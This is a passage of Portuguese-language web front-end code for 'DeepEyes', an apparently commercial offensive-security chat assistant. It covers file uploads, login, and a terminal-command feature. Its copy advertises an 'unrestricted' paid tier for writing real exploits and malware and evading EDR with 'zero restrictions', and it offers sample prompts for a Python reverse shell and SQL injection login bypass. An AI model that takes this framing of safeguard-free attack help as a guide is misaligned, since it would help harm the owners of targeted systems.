                                <div class="w-10 h-10 rounded-lg bg-[#8b5cf6]/10 flex items-center justify-center">
                                    <i class="fas fa-robot text-[#8b5cf6]"></i>
                                </div>
                                <span class="text-gray-400 text-xs uppercase tracking-wider">Mensagens</span>
                            </div>
                            <div class="text-3xl font-bold text-white" id="dashStatMessages">0</div>
                        </div>
                        
                        <!-- Checklists -->
                        <div class="bg-[#1a1a24] border border-[#2a2a3a] rounded-xl p-4 hover:border-[#00FF88]/30 transition-all">
                            <div class="flex items-center gap-3 mb-3">
                                <div class="w-10 h-10 rounded-lg bg-[#00FF88]/10 flex items-center justify-center">
                                    <i class="fas fa-clipboard-check text-[#00FF88]"></i>
                                </div>
                                <span class="text-gray-400 text-xs uppercase tracking-wider">Checklists</span>
                            </div>
                            <div class="text-3xl font-bold text-white" id="dashStatChecklists">0</div>
                        </div>
                        
                        <!-- Uso Diário -->
                        <div class="bg-[#1a1a24] border border-[#2a2a3a] rounded-xl p-4 hover:border-[#F97316]/30 transition-all">
                            <div class="flex items-center gap-3 mb-3">
                                <div class="w-10 h-10 rounded-lg bg-[#F97316]/10 flex items-center justify-center">
                                    <i class="fas fa-bolt text-[#F97316]"></i>
                                </div>
                                <span class="text-gray-400 text-xs uppercase tracking-wider">Uso Hoje</span>
                            </div>
                            <div class="flex items-baseline gap-2">
                                <span class="text-3xl font-bold text-white" id="dashStatUsed">0</span>
                                <span class="text-gray-500">/ <span id="dashStatLimit">0</span></span>
                            </div>
                            <div class="w-full bg-[#2a2a3a] rounded-full h-1.5 mt-3">
                                <div class="h-1.5 rounded-full bg-gradient-to-r from-[#F97316] to-[#EF4444] transition-all duration-500" id="dashUsageBar" style="width: 0%"></div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Feature Cards -->
                    <!-- Dica + Warning -->
                    <div class="w-full flex flex-col sm:flex-row gap-3">
                        <!-- Dica -->
                        <div class="flex-1 bg-[#1a1a24] border border-[#00D4FF]/20 rounded-xl p-3">
                            <div class="flex items-center gap-3">
                                <i class="fas fa-lightbulb text-[#00D4FF]"></i>
                                <p class="text-[11px] text-gray-400">Digite <code class="text-[#00FF88] bg-[#00FF88]/10 px-1.5 py-0.5 rounded">$ comando</code> no chat para executar no terminal</p>
                            </div>
                        </div>
                        
                        <!-- Warning -->
                        <div class="flex-1 bg-[#1a1a24] border border-[#EF4444]/20 rounded-xl p-3">
                            <div class="flex items-center gap-3">
                                <i class="fas fa-radiation text-[#EF4444] animate-pulse"></i>
                                <p class="text-[11px] text-gray-400">Use apenas em ambientes autorizados</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Welcome para Sessao (sem mensagens ainda) -->
                <div id="sessionWelcome" class="flex flex-col items-center justify-center h-full text-center hidden">
                    <h3 class="text-2xl font-bold text-white mb-2">Pronto para começar!</h3>
                    <p class="text-gray-400 max-w-md mb-6">
                        Faça sua primeira pergunta e eu vou te ajudar com técnicas de 
                        <span class="text-[#00FF88] font-semibold">Pentest</span> e 
                        <span class="text-[#00D4FF] font-semibold">Red Team</span>.
                    </p>
                    
                    <!-- Dica do Terminal Integrado (apenas Full Attack) -->
                    <div id="terminalTipCard" class="w-full max-w-md mb-4 hidden">
                        <div class="de-card p-3 border-[rgba(0,212,255,0.2)] bg-[rgba(0,212,255,0.03)]">
                            <div class="flex items-center gap-3">
                                <div class="w-8 h-8 rounded-lg bg-[rgba(0,212,255,0.1)] flex items-center justify-center border border-[rgba(0,212,255,0.2)]">
                                    <i class="fas fa-terminal text-[#00d4ff] text-sm"></i>
                                </div>
                                <div class="text-left flex-1">
                                    <p class="text-xs font-semibold text-white">Terminal Integrado</p>
                                    <p class="text-[10px] text-gray-400">Digite <code class="text-[#00ff88] bg-[rgba(0,255,136,0.1)] px-1 rounded">$ comando</code> para executar e a IA analisa o resultado</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Exemplos de Perguntas - Premium Style -->
                    <div class="w-full max-w-md">
                        <h4 class="text-xs font-semibold text-gray-400 mb-3 flex items-center gap-2">
                            <i class="fas fa-lightbulb text-[#F97316]"></i>
                            Experimente Perguntar
                        </h4>
                        <div class="grid grid-cols-1 gap-2">
                            <button id="terminalExampleBtn" onclick="setExampleQuestion(this)" class="de-card p-3 text-left hover:border-[rgba(0,212,255,0.3)] transition-all group hidden">
                                <p class="text-xs text-gray-400 group-hover:text-white transition-colors flex items-center gap-2">
                                    <i class="fas fa-terminal text-[#00d4ff] text-[10px]"></i>
                                    $ nmap -sV deepeyes.online
                                </p>
                            </button>
                            <button onclick="setExampleQuestion(this)" class="de-card p-3 text-left hover:border-[rgba(0,255,136,0.3)] transition-all group">
                                <p class="text-xs text-gray-400 group-hover:text-white transition-colors flex items-center gap-2">
                                    <i class="fas fa-chevron-right text-[#00FF88] text-[10px] opacity-0 group-hover:opacity-100 transition-opacity"></i>
                                    Como fazer SQL injection em login bypass?
                                </p>
                            </button>
                            <button onclick="setExampleQuestion(this)" class="de-card p-3 text-left hover:border-[rgba(0,255,136,0.3)] transition-all group">
                                <p class="text-xs text-gray-400 group-hover:text-white transition-colors flex items-center gap-2">
                                    <i class="fas fa-chevron-right text-[#00FF88] text-[10px] opacity-0 group-hover:opacity-100 transition-opacity"></i>
                                    Gere um reverse shell em Python para Linux
                                </p>
                            </button>
                        </div>
                    </div>
                    
                    <p class="mt-5 text-[10px] text-[#EF4444] flex items-center gap-2">
                        <i class="fas fa-radiation animate-pulse"></i>
                        Use apenas em ambientes autorizados
                    </p>
                </div>
                
                <!-- Banner de Planos Premium -->
                <div id="premiumBanner" class="mb-4 hidden">
                    <div class="bg-gradient-to-r from-[#1a1f2e] via-[#1e2538] to-[#1a1f2e] border border-yellow-500/20 rounded-lg p-3 flex items-center justify-between gap-4">
                        <div class="flex items-center gap-3">
                            <div class="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-500/20 to-orange-500/20 flex items-center justify-center flex-shrink-0">
                                <i class="fas fa-crown text-yellow-500 text-sm"></i>
                            </div>
                            <div>
                                <p class="text-xs text-gray-300">
                                    <span class="text-yellow-500 font-semibold">Upgrade para Full Attack</span> — 
                                    Crie scripts, exploits e ataques reais sem nenhuma restrição da IA
                                </p>
                            </div>
                        </div>
                        <a href="/profile" class="flex-shrink-0 px-3 py-1.5 bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-400 hover:to-orange-400 text-black text-xs font-semibold rounded-lg transition-all">
                            Ver Planos
                        </a>
                    </div>
                </div>
                
                <div id="messagesContainer" class="space-y-6 hidden"></div>
                
                <!-- Typing Indicator - Premium Spinner -->
                <div id="typingIndicator" class="hidden flex items-center gap-5 mt-6 p-4">
                    <!-- Spinner animado -->
                    <div class="ai-spinner flex-shrink-0">
                        <div class="spinner-outer"></div>
                        <div class="spinner-inner"></div>
                        <div class="spinner-core">
                            <i class="fas fa-brain"></i>
                        </div>
                    </div>
                    
                    <!-- Texto de status -->
                    <div class="flex flex-col gap-1">
                        <span class="thinking-text text-base font-semibold">Analisando...</span>
                        <span class="text-xs text-gray-500 flex items-center gap-2">
                            <i class="fas fa-microchip text-[#00D4FF] animate-pulse"></i>
                            DeepEyes está processando sua solicitação
                        </span>
                    </div>
                </div>
            </div>
            
            <!-- Chat Input - Cyberpunk Terminal Design -->
            <div id="chatInputArea" class="p-4 hidden">
                <!-- Container com efeito glow -->
                <div class="relative max-w-4xl mx-auto">
                    <!-- Glow effect background -->
                    <div class="absolute -inset-1 bg-gradient-to-r from-[#00FF88]/20 via-[#00D4FF]/10 to-[#00FF88]/20 blur-lg opacity-0 transition-opacity duration-500" id="inputGlow"></div>
                    
                    <!-- Main input container - Cyber Style -->
                    <div class="relative bg-[rgba(10,10,15,0.95)] backdrop-blur-xl border border-[rgba(0,255,136,0.2)] shadow-2xl overflow-hidden transition-all duration-300 hover:border-[rgba(0,255,136,0.4)] focus-within:border-[rgba(0,255,136,0.6)] focus-within:shadow-[0_0_30px_rgba(0,255,136,0.15)]" id="inputContainer" style="clip-path: polygon(0 8px, 8px 8px, 8px 0, calc(100% - 8px) 0, calc(100% - 8px) 8px, 100% 8px, 100% calc(100% - 8px), calc(100% - 8px) calc(100% - 8px), calc(100% - 8px) 100%, 8px 100%, 8px calc(100% - 8px), 0 calc(100% - 8px));">
                        <!-- Top glow line -->
                        <div class="absolute top-0 left-0 right-0 h-[1px] bg-gradient-to-r from-transparent via-[#00FF88] to-transparent opacity-50"></div>
                        
                        <!-- Preview do anexo -->
                        <div id="attachmentPreview" class="hidden border-b border-[rgba(0,255,136,0.1)]">
                            <div class="p-3 flex items-center justify-between">
                                <div class="flex items-center gap-3">
                                    <div id="attachmentIcon" class="w-12 h-12 border border-[#00FF88]/40 flex items-center justify-center" style="background: linear-gradient(135deg, rgba(0,255,136,0.15), rgba(0,212,255,0.1)); clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
                                        <i class="fas fa-file-code text-[#00FF88] text-lg"></i>
                                    </div>
                                    <div>
                                        <p id="attachmentName" class="text-[#00FF88] text-sm font-semibold truncate max-w-xs" style="font-family: var(--font-mono);"></p>
                                        <p id="attachmentInfo" class="text-gray-500 text-xs mt-0.5" style="font-family: var(--font-mono);"></p>
                                    </div>
                                </div>
                                <button type="button" onclick="removeAttachment()" class="w-8 h-8 bg-[rgba(239,68,68,0.1)] hover:bg-[rgba(239,68,68,0.2)] border border-[rgba(239,68,68,0.3)] text-[#EF4444] hover:text-white transition-all flex items-center justify-center">
                                    <i class="fas fa-times text-sm"></i>
                                </button>
                            </div>
                            <!-- Preview de imagem -->
                            <div id="imagePreviewContainer" class="hidden px-3 pb-3">
                                <img id="imagePreview" class="max-h-32 object-contain border border-[rgba(0,255,136,0.2)]" alt="Preview">
                            </div>
                        </div>
                        
                        <form id="messageForm" class="flex items-end gap-2 p-3">
                            <!-- Input de arquivo oculto -->
                            <input type="file" id="fileInput" class="hidden" accept=".txt,.py,.js,.php,.html,.css,.json,.xml,.sh,.bat,.ps1,.sql,.md,.c,.cpp,.h,.java,.rb,.go,.rs,.ts,.vue,.jsx,.tsx,.yaml,.yml,.toml,.ini,.cfg,.conf,.env,.log,.csv,.dockerfile,.makefile,.gitignore,.htaccess,.nginx,.apache,.reg,.vbs,.asm,.lua,.perl,.pl,.r,.scala,.kt,.swift,.dart,.ex,.exs,.elm,.hs,.clj,.lisp,.scm,.ml,.fs,.pas,.vb,.m,.mm,.groovy,.gradle,.cmake,.proto,.graphql,.prisma,.tf,.hcl,image/*">
                            
                            <!-- Botao de anexo - Cyber Style -->
                            <button 
                                type="button" 
                                id="attachBtn"
                                onclick="document.getElementById('fileInput').click()"
                                class="w-10 h-10 bg-[rgba(0,0,0,0.4)] hover:bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.2)] hover:border-[rgba(0,255,136,0.5)] text-gray-500 hover:text-[#00FF88] transition-all flex-shrink-0 flex items-center justify-center group"
                                title="Anexar arquivo ou imagem"
                                style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));"
                            >
                                <i class="fas fa-plus text-sm group-hover:rotate-90 transition-transform duration-300"></i>
                            </button>
                            
                            <!-- Textarea container -->
                            <div class="flex-1 relative">
                                <span class="absolute left-0 top-1/2 -translate-y-1/2 text-[#00FF88] opacity-50" style="font-family: var(--font-mono);">></span>
                                <textarea 
                                    id="messageInput" 
                                    rows="1"
                                    placeholder="Digite sua mensagem ou $ comando para terminal..."
                                    class="w-full bg-transparent text-[#00FF88] text-sm resize-none focus:outline-none placeholder-[rgba(0,255,136,0.3)] py-2.5 pl-4 pr-1 max-h-32"
                                    style="scrollbar-width: thin; scrollbar-color: rgba(0,255,136,0.3) transparent; font-family: var(--font-mono); caret-color: #00FF88;"
                                    disabled
                                ></textarea>
                            </div>
                            
                            <!-- Botao de enviar - Cyber Style -->
                            <button 
                                type="submit" 
                                id="sendBtn"
                                disabled
                                class="w-10 h-10 bg-gradient-to-r from-[#00FF88] to-[#00D4FF] hover:from-[#00FF88] hover:to-[#00FF88] disabled:opacity-30 disabled:cursor-not-allowed text-[#0a0a0f] font-bold transition-all flex-shrink-0 flex items-center justify-center shadow-lg shadow-[rgba(0,255,136,0.3)] hover:shadow-[0_0_20px_rgba(0,255,136,0.5)] hover:scale-105 active:scale-95"
                                title="Enviar mensagem"
                                style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));"
                            >
                                <i class="fas fa-arrow-up text-sm"></i>
                            </button>
                            
                            <!-- Botao de cancelar (oculto por padrao) -->
                            <button 
                                type="button" 
                                id="cancelBtn"
                                class="hidden w-10 h-10 bg-gradient-to-r from-red-700 to-red-600 hover:from-red-600 hover:to-red-500 text-white transition-all flex-shrink-0 flex items-center justify-center shadow-lg shadow-red-500/30 hover:shadow-[0_0_20px_rgba(239,68,68,0.5)] hover:scale-105 active:scale-95 animate-pulse"
                                title="Cancelar resposta"
                                style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));"
                            >
                                <i class="fas fa-stop text-sm"></i>
                            </button>
                        </form>
                        
                        <!-- Barra inferior com info - Cyber Style -->
                        <div class="px-4 py-2 border-t border-[rgba(0,255,136,0.1)] flex items-center justify-between text-xs" style="font-family: var(--font-mono); background: rgba(0,0,0,0.3);">
                           
                            <span class="text-gray-600">
                                <kbd class="px-1.5 py-0.5 bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.2)] text-[10px] text-[#00FF88]">Enter</kbd> enviar
                                <span class="mx-1">•</span>
                                <kbd class="px-1.5 py-0.5 bg-slate-700/50 rounded text-[10px]">Shift+Enter</kbd> nova linha
                            </span>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
        // State
        let token = localStorage.getItem('token');
        let currentUser = null;
        let currentSession = null;
        let sessions = [];
        let userAvatarUrl = null;
        let currentAttachment = null; // Para armazenar o anexo atual
        let currentAbortController = null; // Para cancelar requisições
        
        // Terminal integrado no chat
        const TERMINAL_PREFIX = '$'; // Prefixo para comandos do terminal
        const terminalHistory = []; // Histórico de comandos executados na sessão
        
        // DOM Elements
        const authModal = document.getElementById('authModal');
        const loginForm = document.getElementById('loginForm');
        const registerForm = document.getElementById('registerForm');
        const authError = document.getElementById('authError');
        const authTabs = document.querySelectorAll('.auth-tab');
        const messageForm = document.getElementById('messageForm');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const messagesContainer = document.getElementById('messagesContainer');
        const homeWelcome = document.getElementById('homeWelcome');
        const sessionWelcome = document.getElementById('sessionWelcome');
        const typingIndicator = document.getElementById('typingIndicator');
        const sessionsList = document.getElementById('sessionsList');
        const newChatBtn = document.getElementById('newChatBtn');
        const profileSelector = document.getElementById('profileSelector');
        const logoutBtn = document.getElementById('logoutBtn');
        
        // Funcao para preencher exemplo de pergunta
        function setExampleQuestion(btn) {
            const text = btn.querySelector('p').textContent;
            messageInput.value = text;
            messageInput.focus();
        }
        
        // Funcoes para gerenciar anexos
        const fileInput = document.getElementById('fileInput');
        const attachmentPreview = document.getElementById('attachmentPreview');
        const attachmentName = document.getElementById('attachmentName');
        const attachmentInfo = document.getElementById('attachmentInfo');
        const attachmentIcon = document.getElementById('attachmentIcon');
        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
        const imagePreview = document.getElementById('imagePreview');
        
        // Paste de imagem (Ctrl+V ou Print Screen)
        document.addEventListener('paste', async (e) => {
            const items = e.clipboardData?.items;
            if (!items) return;
            
            for (const item of items) {
                if (item.type.startsWith('image/')) {
                    e.preventDefault();
                    const file = item.getAsFile();
                    if (!file) continue;
                    
                    const maxSize = 10 * 1024 * 1024; // 10MB
                    if (file.size > maxSize) {
                        showNotification('Imagem muito grande. Máximo: 10MB', 'error');
                        return;
                    }
                    
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        currentAttachment = {
                            type: 'image',
                            name: 'screenshot.png',
                            size: file.size,
                            content: event.target.result
                        };
                        showAttachmentPreview(file, true, event.target.result);
                        showNotification('Imagem colada! Envie sua mensagem.', 'success');
                        messageInput.focus();
                    };
                    reader.readAsDataURL(file);
                    break;
                }
            }
        });
        
        fileInput.addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;
            
            const isImage = file.type.startsWith('image/');
            const maxSize = isImage ? 10 * 1024 * 1024 : 50 * 1024 * 1024; // 10MB para imagens, 50MB para scripts
            
            if (file.size > maxSize) {
                showNotification(`Arquivo muito grande. Maximo: ${isImage ? '10MB' : '50MB'}`, 'error');
                fileInput.value = '';
                return;
            }
            
            try {
                if (isImage) {
                    // Para imagens, converter para base64
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        currentAttachment = {
                            type: 'image',
                            name: file.name,
                            size: file.size,
                            content: event.target.result
                        };
                        showAttachmentPreview(file, true, event.target.result);
                    };
                    reader.readAsDataURL(file);
                } else {
                    // Para scripts/texto, ler como texto
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        currentAttachment = {
                            type: 'code',
                            name: file.name,
                            size: file.size,
                            content: event.target.result,
                            extension: file.name.split('.').pop().toLowerCase()
                        };
                        showAttachmentPreview(file, false);
                    };
                    reader.readAsText(file);
                }
            } catch (error) {
                showNotification('Erro ao ler arquivo', 'error');
                fileInput.value = '';
            }
        });
        
        function showAttachmentPreview(file, isImage, imageData = null) {
            attachmentName.textContent = file.name;
            attachmentInfo.textContent = formatFileSize(file.size) + (currentAttachment.type === 'code' ? ` � ${countLines(currentAttachment.content)} linhas` : '');
            
            if (isImage) {
                attachmentIcon.innerHTML = '<i class="fas fa-image text-green-400"></i>';
                imagePreview.src = imageData;
                imagePreviewContainer.classList.remove('hidden');
            } else {
                const iconMap = {
                    'py': { icon: 'fab fa-python', color: 'text-yellow-400' },
                    'js': { icon: 'fab fa-js', color: 'text-yellow-300' },
                    'ts': { icon: 'fab fa-js', color: 'text-blue-400' },
                    'jsx': { icon: 'fab fa-react', color: 'text-cyan-400' },
                    'tsx': { icon: 'fab fa-react', color: 'text-cyan-400' },
                    'vue': { icon: 'fab fa-vuejs', color: 'text-green-400' },
                    'php': { icon: 'fab fa-php', color: 'text-purple-400' },
                    'html': { icon: 'fab fa-html5', color: 'text-orange-400' },
                    'css': { icon: 'fab fa-css3', color: 'text-blue-400' },
                    'scss': { icon: 'fab fa-sass', color: 'text-pink-400' },
                    'sass': { icon: 'fab fa-sass', color: 'text-pink-400' },
                    'json': { icon: 'fas fa-brackets-curly', color: 'text-yellow-300' },
                    'xml': { icon: 'fas fa-code', color: 'text-orange-300' },
                    'yaml': { icon: 'fas fa-file-code', color: 'text-red-300' },
                    'yml': { icon: 'fas fa-file-code', color: 'text-red-300' },
                    'toml': { icon: 'fas fa-file-code', color: 'text-gray-300' },
                    'ini': { icon: 'fas fa-cog', color: 'text-gray-400' },
                    'cfg': { icon: 'fas fa-cog', color: 'text-gray-400' },
                    'conf': { icon: 'fas fa-cog', color: 'text-gray-400' },
                    'env': { icon: 'fas fa-key', color: 'text-yellow-500' },
                    'sql': { icon: 'fas fa-database', color: 'text-blue-300' },
                    'sh': { icon: 'fas fa-terminal', color: 'text-green-300' },
                    'bash': { icon: 'fas fa-terminal', color: 'text-green-300' },
                    'zsh': { icon: 'fas fa-terminal', color: 'text-green-300' },
                    'bat': { icon: 'fas fa-terminal', color: 'text-gray-400' },
                    'ps1': { icon: 'fas fa-terminal', color: 'text-blue-400' },
                    'cmd': { icon: 'fas fa-terminal', color: 'text-gray-400' },
                    'md': { icon: 'fab fa-markdown', color: 'text-white' },
                    'txt': { icon: 'fas fa-file-alt', color: 'text-gray-300' },
                    'log': { icon: 'fas fa-file-alt', color: 'text-gray-400' },
                    'csv': { icon: 'fas fa-file-csv', color: 'text-green-300' },
                    'c': { icon: 'fas fa-code', color: 'text-blue-400' },
                    'cpp': { icon: 'fas fa-code', color: 'text-blue-500' },
                    'h': { icon: 'fas fa-code', color: 'text-blue-300' },
                    'java': { icon: 'fab fa-java', color: 'text-red-400' },
                    'kt': { icon: 'fas fa-code', color: 'text-purple-400' },
                    'swift': { icon: 'fab fa-swift', color: 'text-orange-400' },
                    'go': { icon: 'fab fa-golang', color: 'text-cyan-400' },
                    'rs': { icon: 'fas fa-code', color: 'text-orange-500' },
                    'rb': { icon: 'fas fa-gem', color: 'text-red-400' },
                    'lua': { icon: 'fas fa-moon', color: 'text-blue-400' },
                    'r': { icon: 'fas fa-chart-line', color: 'text-blue-400' },
                    'dart': { icon: 'fas fa-code', color: 'text-cyan-400' },
                    'dockerfile': { icon: 'fab fa-docker', color: 'text-blue-400' },
                    'makefile': { icon: 'fas fa-cogs', color: 'text-gray-400' },
                    'gitignore': { icon: 'fab fa-git-alt', color: 'text-orange-400' },
                    'htaccess': { icon: 'fas fa-server', color: 'text-red-400' },
                    'nginx': { icon: 'fas fa-server', color: 'text-green-400' },
                    'graphql': { icon: 'fas fa-project-diagram', color: 'text-pink-400' },
                    'prisma': { icon: 'fas fa-database', color: 'text-indigo-400' },
                    'tf': { icon: 'fas fa-cloud', color: 'text-purple-400' },
                    'hcl': { icon: 'fas fa-cloud', color: 'text-purple-400' }
                };
                const ext = file.name.split('.').pop().toLowerCase();
                const iconInfo = iconMap[ext] || { icon: 'fas fa-file-code', color: 'text-purple-400' };
                attachmentIcon.innerHTML = `<i class="${iconInfo.icon} ${iconInfo.color}"></i>`;
                imagePreviewContainer.classList.add('hidden');
            }
            
            attachmentPreview.classList.remove('hidden');
        }
        
        function removeAttachment() {
            currentAttachment = null;
            fileInput.value = '';
            attachmentPreview.classList.add('hidden');
            imagePreviewContainer.classList.add('hidden');
        }
        
        function formatFileSize(bytes) {
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
            return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
        }
        
        function countLines(text) {
            return text.split('\n').length;
        }
        
        // Notification System
        function showNotification(message, type = 'info') {
            const colors = { 'success': 'bg-green-500', 'error': 'bg-red-500', 'warning': 'bg-yellow-500', 'info': 'bg-blue-500' };
            const icons = { 'success': 'fa-check-circle', 'error': 'fa-exclamation-circle', 'warning': 'fa-exclamation-triangle', 'info': 'fa-info-circle' };
            
            const notification = document.createElement('div');
            notification.className = `fixed top-4 right-4 z-[100] ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg flex items-center gap-3 animate-slide-in`;
            notification.innerHTML = `<i class="fas ${icons[type]}"></i><span>${message}</span>`;
            document.body.appendChild(notification);
            setTimeout(() => { notification.classList.add('opacity-0'); setTimeout(() => notification.remove(), 300); }, 3000);
        }
        
        // API Helper
        async function api(endpoint, options = {}) {
            const headers = { 'Content-Type': 'application/json', 'Accept': 'application/json', ...options.headers };
            if (token) headers['Authorization'] = `Bearer ${token}`;
            
            try {
                const response = await fetch(`/api${endpoint}`, { ...options, headers });
                const data = await response.json();
                
                if (!response.ok) {
                    if (response.status === 422 && data.errors) {
                        const firstError = Object.values(data.errors)[0];
                        throw new Error(Array.isArray(firstError) ? firstError[0] : firstError);
                    }
                    throw new Error(data.message || 'Erro na requisição');
                }
                return data;
            } catch (error) {
                throw error;
            }
        }
        
        // Auth Tabs
        authTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const tabName = tab.dataset.tab;
                authTabs.forEach(t => {
                    t.classList.remove('active', 'bg-red-600', 'text-white');
                    t.classList.add('bg-slate-800', 'text-gray-400');
                });
                tab.classList.add('active', 'bg-red-600', 'text-white');
                tab.classList.remove('bg-slate-800', 'text-gray-400');
                
                if (tabName === 'login') {
                    loginForm.classList.remove('hidden');
                    registerForm.classList.add('hidden');
                } else {
                    loginForm.classList.add('hidden');
                    registerForm.classList.remove('hidden');
                }
                authError.classList.add('hidden');
            });
        });
        
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(loginForm);
            const submitBtn = loginForm.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            
            const emailValue = formData.get('email');
            const passwordValue = formData.get('password');
            
            if (!emailValue || !passwordValue) {
                showAuthError('Por favor, preencha todos os campos');
                return;
            }
            
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Entrando...';
            submitBtn.disabled = true;
            
            try {
                const data = await api('/auth/login', {
                    method: 'POST',
                    body: JSON.stringify({ email: emailValue, password: passwordValue })
                });
                
                token = data.data.token;
                localStorage.setItem('token', token);
                currentUser = data.data.user;
                submitBtn.innerHTML = '<i class="fas fa-check mr-2"></i>Sucesso!';
                setTimeout(() => onAuthSuccess(), 500);
            } catch (error) {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                showAuthError(error.message || 'Erro ao fazer login');
            }
        });
        
        registerForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(registerForm);
            const submitBtn = registerForm.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            
            const nameValue = formData.get('name');
            const emailValue = formData.get('email');
            const passwordValue = formData.get('password');
            const confirmValue = formData.get('password_confirmation');
            
            if (!nameValue || !emailValue || !passwordValue || !confirmValue) {
                showAuthError('Por favor, preencha todos os campos');
                return;
            }
            
            if (passwordValue !== confirmValue) {
                showAuthError('As senhas não coincidem');
                return;
            }
            
            if (passwordValue.length < 8) {
                showAuthError('A senha deve ter pelo menos 8 caracteres');
                return;
            }
            
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Criando conta...';
            submitBtn.disabled = true;
            
            try {
                const data = await api('/auth/register', {
                    method: 'POST',
                    body: JSON.stringify({
                        name: nameValue,
                        email: emailValue,
                        password: passwordValue,
                        password_confirmation: confirmValue
                    })
                });
                
                token = data.data.token;
                localStorage.setItem('token', token);
                currentUser = data.data.user;
                onAuthSuccess();
            } catch (error) {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                showAuthError(error.message || 'Erro ao criar conta');
            }
        });
        
        function showAuthError(message) {
            authError.textContent = message;
            authError.classList.remove('hidden');
        }
        
        // Avatar padrão para usuários sem foto
        const DEFAULT_AVATAR = 'https://ui-avatars.com/api/?name=User&background=1a1a24&color=00d4ff&size=128&bold=true';
        
        async function updateUserAvatar() {
            try {
                const data = await api('/profile');
                const avatarImg = document.getElementById('userAvatarImg');
                const avatarIcon = document.getElementById('userAvatarIcon');
                
                if (data.user && data.user.avatar) {
                    userAvatarUrl = data.user.avatar;
                    avatarImg.src = data.user.avatar;
                    avatarImg.classList.remove('hidden');
                    if (avatarIcon) avatarIcon.classList.add('hidden');
                } else {
                    // Usa avatar padrão com iniciais do nome
                    const userName = data.user?.name || 'User';
                    const initials = userName.split(' ').map(n => n[0]).join('').substring(0, 2).toUpperCase();
                    userAvatarUrl = `https://ui-avatars.com/api/?name=${encodeURIComponent(initials)}&background=1a1a24&color=00d4ff&size=128&bold=true`;
                    avatarImg.src = userAvatarUrl;
                    avatarImg.classList.remove('hidden');
                    if (avatarIcon) avatarIcon.classList.add('hidden');
                }
            } catch (error) {
                console.error('Erro ao carregar avatar:', error);
                // Mostra avatar padrão em caso de erro
                const avatarImg = document.getElementById('userAvatarImg');
                const avatarIcon = document.getElementById('userAvatarIcon');
                avatarImg.src = DEFAULT_AVATAR;
                avatarImg.classList.remove('hidden');
                if (avatarIcon) avatarIcon.classList.add('hidden');
                userAvatarUrl = DEFAULT_AVATAR;
            }
        }
        
        const profileDescriptions = {
            'pentest': 'Modo ofensivo para pentest autorizado - comandos e payloads reais',
            'redteam': 'Simulação de Atacante e adversarios - técnicas avançadas e sofisticadas de Invasão',
            'fullattack': 'Modo irrestrito - exploits, malware, full attack'
        };
        
        const profileInfo = {
            'pentest': {
                name: 'DeepEyes - Ofensivo',
                icon: 'fa-skull-crossbones',
                color: 'from-red-600 to-red-800',
                iconColor: 'text-red-400',
                badge: { text: 'RESTRITO', class: 'bg-yellow-600/20 text-yellow-400 border-yellow-600/30', icon: 'fa-lock' },
                features: ['SQL Injection', 'XSS Payloads', 'Reverse Shells', 'Privilege Escalation']
            },
            'redteam': {
                name: 'BlackSentinel - Red Team',
                icon: 'fa-crosshairs',
                color: 'from-orange-600 to-orange-800',
                iconColor: 'text-orange-400',
                badge: { text: 'RESTRITO', class: 'bg-yellow-600/20 text-yellow-400 border-yellow-600/30', icon: 'fa-lock' },
                features: ['Simulacao APT', 'Evasao de EDR', 'C2 Frameworks', 'Lateral Movement']
            },
            'fullattack': {
                name: 'DarkMind - Irrestrito',
                icon: 'fa-biohazard',
                color: 'from-purple-600 to-purple-800',
                iconColor: 'text-purple-400',
                badge: { text: 'LIVRE', class: 'bg-green-600/20 text-green-400 border-green-600/30', icon: 'fa-unlock' },
                features: ['Zero Restricoes', 'Exploits Reais', 'Malware Dev', 'Qualquer Pergunta']
            }
        };
        
        function updateWelcomeProfile(profileKey) {
            const info = profileInfo[profileKey];
            if (!info) return;
            
